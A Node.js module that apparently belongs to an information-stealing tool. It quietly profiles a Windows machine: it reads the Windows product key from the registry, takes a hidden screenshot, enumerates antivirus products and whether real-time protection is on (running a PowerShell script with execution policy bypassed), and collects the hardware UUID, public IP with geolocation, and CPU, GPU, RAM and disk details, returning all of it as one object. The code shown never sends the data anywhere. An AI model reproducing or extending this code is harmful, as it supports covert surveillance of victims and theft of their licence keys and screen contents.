const child_process = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

const hardware = require('./../hardware/hardware.js');
const program = require('./../program/program.js');

const GetPCDisk = async () => {
    try {
        const output = await program.ExecCommand('wmic logicaldisk get size');
        const [size] = output.split(/\s+/)
            .filter(item => item && item.toLowerCase() !== 'size');

        return size ? (
            Math.floor(parseInt(size) / (1024 * 1024 * 1024))
        ).toString() : '1000';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetTotalMemory = async () => {
    try {
        const output = await program.ExecCommand('wmic computersystem get totalphysicalmemory | more +1');

        return Math.floor(
            parseInt(output) / (1024 * 1024 * 1024)
        ) || '0';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetCleanHWID = async () => {
    try {
        const output = await program.ExecCommand('wmic csproduct get uuid');
        const match = output.match(/UUID\s+([A-Fa-f0-9-]+)/);

        return match ? match[1] : '';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetCpuCount = async () => {
    try {
        const output = await program.ExecCommand('echo %NUMBER_OF_PROCESSORS%');

        return parseInt(
            output
        ) || '4';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetNetwork = async () => {
    try {
        const output = await program.ExecCommand('curl -s http://ip-api.com/json');

        return JSON.parse(
            output
        ) || {};
    } catch (error) {
        console.error(error);
        return {};
    }
};

const GetScreenShots = async () => {
    const tempFile = path.join(os.tmpdir(), program.RandString(10));

    try {
        fs.mkdirSync(tempFile, { recursive: true });
        const screenshot = path.join(tempFile, 'screenshot.png');

        child_process.execSync(`powershell.exe -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('${screenshot}'); $graphics.Dispose(); $bitmap.Dispose();"`, {
            cwd: tempFile
        });

        return screenshot;
    } catch (error) {
        console.error(error);
        return null;
    }
};

const GetDisksInfo = async () => {
    try {
        const rootPath = 'C:';
        const {
            available,
            total,
            free
        } = await hardware.CheckDiskUsage(rootPath);

        const freeGB = (free / (1024 ** 3)).toFixed(2) + 'GB';
        const totalGB = (total / (1024 ** 3)).toFixed(2) + 'GB';
        const usedPercent = ((1 - (available / total)) * 100).toFixed(2) + '%';
        const column = 12;

        const header = [
            'Drive'.padEnd(column),
            'Free'.padEnd(column),
            'Total'.padEnd(column),
            'Use'.padEnd(column)
        ].join('');

        return [
            header,
            `${rootPath.padEnd(column)}${freeGB.padEnd(column)}${totalGB.padEnd(column)}${usedPercent.padEnd(column)}`
        ].join('\n');
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetWindowsVersion = async () => {
    try {
        const output = await program.ExecCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName");
        return output;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetWindowsProductKey = async () => {
    try {
        const output = await program.ExecCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault");
        return output;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetCPU = async () => {
    try {
        const output = await program.ExecCommand('wmic cpu get name | more +1');
        return output;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetGPU = async () => {
    try {
        const output = program.ExecCommand('wmic PATH Win32_VideoController get name | more +1');
        return output;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetLocalIP = async () => {
    try {
        const output = program.ExecPowerShell('(Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress');
        return output;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetOS = async () => {
    try {
        const output = program.ExecCommand('wmic OS get caption, osarchitecture | more +1');
        return output;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const GetAntivirus = async () => {
    const powershellScript = `
        function Get-AntiVirusInfo {
            [CmdletBinding()]
            param (
            [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
            [Alias('name')]
            $targetComputer=$env:computername
            )

            $antiVirusDetails = Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ComputerName $targetComputer

            $result = @()
            foreach ($antiVirusProduct in $antiVirusDetails) {
                switch ($antiVirusProduct.productState) {
                    "262144" { $definitionStatus = "Up to date"; $realTimeStatus = "Disabled" }
                    "262160" { $definitionStatus = "Out of date"; $realTimeStatus = "Disabled" }
                    "266240" { $definitionStatus = "Up to date"; $realTimeStatus = "Enabled" }
                    "266256" { $definitionStatus = "Out of date"; $realTimeStatus = "Enabled" }
                    "393216" { $definitionStatus = "Up to date"; $realTimeStatus = "Disabled" }
                    "393232" { $definitionStatus = "Out of date"; $realTimeStatus = "Disabled" }
                    "393488" { $definitionStatus = "Out of date"; $realTimeStatus = "Disabled" }
                    "397312" { $definitionStatus = "Up to date"; $realTimeStatus = "Enabled" }
                    "397328" { $definitionStatus = "Out of date"; $realTimeStatus = "Enabled" }
                    "397584" { $definitionStatus = "Out of date"; $realTimeStatus = "Enabled" }
                    default   { $definitionStatus = "Unknown"; $realTimeStatus = "Unknown" }
                }
                
                $antiVirusInfo = @{
                    ComputerName               = $targetComputer
                    ProductName                = $antiVirusProduct.displayName
                    ProductGUID                = $antiVirusProduct.instanceGuid
                    ProductExecutable          = $antiVirusProduct.pathToSignedProductExe
                    ReportingExecutable        = $antiVirusProduct.pathToSignedReportingExe
                    DefinitionStatus           = $definitionStatus
                    RealTimeProtectionStatus   = $realTimeStatus
                }

                $result += New-Object -TypeName PSObject -Property $antiVirusInfo
            }
            
            return $result
        }
        Get-AntiVirusInfo
    `;

    const tempFile = path.join(os.tmpdir(), `${program.RandString(10)}.ps1`);
    fs.writeFileSync(tempFile, powershellScript);

    try {
        const data = child_process.execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempFile}"`, {
            encoding: 'utf8'
        });

        const antivirusInfo = {};

        const lines = data.split('\r\n').filter(line => line.trim() !== '');
        lines.forEach(line => {
            const [key, value] = line.split(':').map(item => item.trim());

            if (key && value) {
                antivirusInfo[key] = value;
            }
        });

        return antivirusInfo;
    } catch (error) {
        console.error(error);
        return 'Not Found';
    } finally {
        fs.unlinkSync(tempFile);
    }
};

module.exports = async () => {
    try {
        return {
            WINDOWS_VERSION: await GetWindowsVersion(),
            ANTIVIRUS_INFO: await GetAntivirus(),
            WINDOWS_KEY: await GetWindowsProductKey(),
            SCREENSHOTS: await GetScreenShots(),
            DISKS_INFO: await GetDisksInfo(),
            CPU_COUNT: await GetCpuCount(),
            NETWORK: await GetNetwork(),
            UUID: await GetCleanHWID(),
            DISK: await GetPCDisk(),
            CPU: await GetCPU(),
            GPU: await GetGPU(),
            RAM: await GetTotalMemory(),
            IP: await GetLocalIP(),
            OS: await GetOS(),
        };
    } catch (error) {
        console.error(error);
    }
};